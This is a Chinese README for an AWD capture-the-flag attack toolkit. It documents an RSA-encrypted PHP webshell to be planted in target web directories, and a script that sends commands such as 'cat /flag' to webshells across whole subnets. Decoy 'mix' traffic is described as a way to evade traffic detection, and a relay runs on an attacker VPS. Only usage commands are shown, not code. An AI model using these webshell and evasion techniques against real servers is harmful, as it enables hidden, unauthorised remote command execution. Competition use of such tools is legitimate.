YL Phantom — AWD 混淆流量 + RSA加密攻击工具包
=================================================
by Wwlsyl 

文件说明:
  rsa_crypto.py         Python RSA加解密模块 (密钥自动生成在 rsa_keys.json)
  mix_attack.py         命令行混淆攻击脚本 (支持普通/Mix/RSA/Mix+RSA)
  rsa_agent.php         RSA代理 (私钥持有者, 放攻击者VPS, 作为加解密中转)
  creep_rsa.php         RSA增强版木马 (公钥嵌入, 放靶机web目录)
  rsa_keys.json         当前密钥对 (Python自动生成)
  awd_toolkit_gui_modified.py  GUI修改版 (替换管理工具/awd_toolkit_gui.py)

使用方法:
  
  1. RSA加密攻击 (防流量检测):
     a. 将 creep_rsa.php 上传到靶机 web 目录
     b. 攻击端执行:
        python mix_attack.py --ip 192.168.1.0/24 --shell-url /creep_rsa.php \
                             --rsa --mix --once -c "cat /flag"
        
     c. 或使用本机 RSA Agent (放本地):
        将 rsa_agent.php 部署到任意 PHP 服务器
        加 --rsa-agent http://your-vps/rsa_agent.php

  2. 普通混淆攻击:
     python mix_attack.py --ip 192.168.1.0/24 --shell-url /shell.php \
                          --pass cmd --mix --once -c "cat /flag"

  3. GUI 集成:
     将 awd_toolkit_gui_modified.py 替换管理工具/awd_toolkit_gui.py
     即可在 GUI 中操作 RSA+混淆

参数说明:
  --ip          目标IP/CIDR (逗号分隔)
  --shell-url   webshell路径 (默认 /shell.php)
  --pass        webshell密码 (默认 cmd)
  -c            执行命令 (可多条)
  --rsa         启用RSA加密通信
  --rsa-agent   RSA Agent地址 (不填用本地密钥)
  --mix         启用混淆流量 (万假一真)
  --fake-count  混淆请求数 (默认8)
  --once        单轮攻击 (默认持续轮询)
  --threads     并发线程数 (默认20)
  --interval    轮询间隔秒数 (默认30)

密钥:
  rsa_keys.json 由 rsa_crypto.py 首次运行时自动生成
  删除此文件重新生成新密钥对
  PHP 和 Python 使用同一套密钥才能通信

工作流程 (RSA模式):
  攻击端 (私钥)                   靶机 (公钥)
    │                               │
    ├─ rsa_crypto.py 加密命令 ─────→ ├─ creep_rsa.php 公钥解密
    │   私钥加密 / 公钥解密          │   公钥解密 / 公钥加密
    │                               │
    ←── rsa_crypto.py 解密响应 ─────┘
